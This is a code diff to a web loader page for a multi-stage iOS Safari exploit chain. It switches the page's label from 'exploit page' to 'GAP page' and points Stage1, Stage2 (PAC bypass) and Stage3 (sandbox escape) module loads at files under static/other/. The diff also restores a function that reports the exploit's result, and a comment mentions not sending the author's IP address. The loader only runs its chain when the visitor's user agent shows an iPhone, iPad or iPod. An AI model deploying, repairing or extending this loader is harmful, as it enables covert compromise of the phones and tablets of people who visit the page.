@@ -42,16 +42,16 @@
             document.body.innerHTML = `
                 <div style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; text-align: center; background: #f5f5f5; min-height: 100vh; margin: 0;">
                     <div style="max-width: 500px; margin: 0 auto; background: white; border-radius: 12px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
-                        <h1 style="color: #333; margin-bottom: 20px;">⚠️ 非 iOS 设备</h1>
-                        <p style="color: #666; line-height: 1.6;">此漏洞利用页面仅适用于 iOS 设备。</p>
-                        <p style="color: #666; line-height: 1.6;">请使用以下方式访问：</p>
+                        <h1 style="color: #333; margin-bottom: 20px;">⚠️ Non-iOS Device</h1>
+                        <p style="color: #666; line-height: 1.6;">This GAP page is only for iOS devices.</p>
+                        <p style="color: #666; line-height: 1.6;">Please access it using one of the following:</p>
                         <ul style="text-align: left; color: #666; line-height: 1.8;">
                             <li>iPhone Safari</li>
                             <li>iPad Safari</li>
                             <li>iPod Safari</li>
                         </ul>
                         <p style="color: #999; font-size: 14px; margin-top: 20px;">
-                            当前 User-Agent: ${navigator.userAgent.substring(0, 100)}...
+                            Current User-Agent: ${navigator.userAgent.substring(0, 100)}...
                         </p>
                     </div>
                 </div>
@@ -299,7 +299,8 @@
             } else {
                 pacModule = await globalThis.moduleManager.getModuleByURL(
                     // Hash: "b586c88246144bc7975ad4e27ec6d62716bf34ea"
-                    "Stage2_13.0_14.x_breezy"
+                    // Served from static/other/
+                    "other/Stage2_13.0_14.x_breezy"
                 );
             }
 
@@ -395,7 +396,8 @@
             } else if (offsets.mmrZ0r) {
                 stage1Module = await globalThis.moduleManager.getModuleByURL(
                     // 7d8f5bae97f37aa318bccd652bf0c1dc38fd8396
-                    "7d8f5bae97f37aa318bccd652bf0c1dc38fd8396"
+                    // Served from static/other/
+                    "other/Stage1_13.0_15.1.1_buffout"
                 );
             }
 
@@ -449,9 +451,10 @@
                 if (true === offsets.wC3yaB && true === platformModule.platformState.qn) {
                     // Load stage3 variant A (with PAC bypass)
                     // Hash: "7f809f320823063b55f26ba0d29cf197e2e333a8"
+                    // Served from static/other/
                     window.log(`[STAGE3] Loading sandbox escape variant A...`);
                     platform = await (await globalThis.moduleManager.getModuleByURL(
-                        "Stage3_VariantA"
+                        "other/Stage3_VariantA"
                     )).lA();
                 } else {
                     // Load stage3 variant B (without PAC / different approach)
@@ -483,22 +486,24 @@
         // ============================================================================
 
         self.setTimeout(async function () {
-            //try {
+            try {
             const result = await triggerExploit();
             window.log(`[LOADER] Reporting result: ${result}`);
-            // reportResult(
-            //     0 === result ? 0 :
-            //     1001 === result ? 1001 :
-            //     1000 === result ? 1000 :
-            //     1003 === result ? 1003 :
-            //     result
-            // );
-            // } catch (e) {
-            //     window.log(`[LOADER] Top-level error:` + e);
-            //     try {
-            //         reportResult(1000);
-            //     } catch (e2) { }
-            // }
+             reportResult(
+                 0 === result ? 0 :
+                 1001 === result ? 1001 :
+             1000 === result ? 1000 :
+                1003 === result ? 1003 :
+                 result
+             );
+             } catch (e) {
+                 window.log(`[LOADER] Top-level error:` + e);
+             try {
+                     reportResult(1000);
+                 } catch (e2) { 
+
+                 }
+             }
         }, 10);
 
         // stop sending my ip addr
